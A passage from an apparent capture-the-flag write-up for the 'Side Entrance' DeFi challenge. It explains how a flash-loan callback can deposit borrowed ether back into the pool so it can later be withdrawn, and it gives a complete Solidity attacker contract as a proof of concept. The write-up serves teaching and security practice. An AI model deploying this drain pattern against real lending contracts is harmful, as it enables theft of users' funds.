contract is `SideEntranceLenderPool.sol` which enforces anyone calling the `flashloan` implements  the`execute` function, the `execute` is expecting the caller of said function to send the amount he borrowed or else the transaction will revert.

### Entry Point

1. Deposit: This function can be called by anyone and since the callback runs after we call flashloan we can make use of this.
2. withdraw: The `balances` map now has a record of our deposit meaning we can call the withdraw function and take the funds.


## POC

```js
contract SideEntranceAttacker {
	// address of the recovery
	// the pool

	SideEntranceLenderPool pool;
	address payable public recovery;


	constructor(address _pool, address payable _recovery) {
		pool = SideEntranceLenderPool(_pool);
		recovery = _recovery;
	}
	function attack() public {
		uint256 poolBalance = address(pool).balance;
		pool.flashloan(poolBalance);
		// this sends the deposited amount to this contract
		pool.withdraw();
		// rescue the funds to the recovery account
		recovery.transfer(address(this).balance);
	}
	function execute() external payable  {
		 pool.deposit{value: msg.value}();
	}
	// we have this here so we can receive funds
	receive() external payable {}
}
```


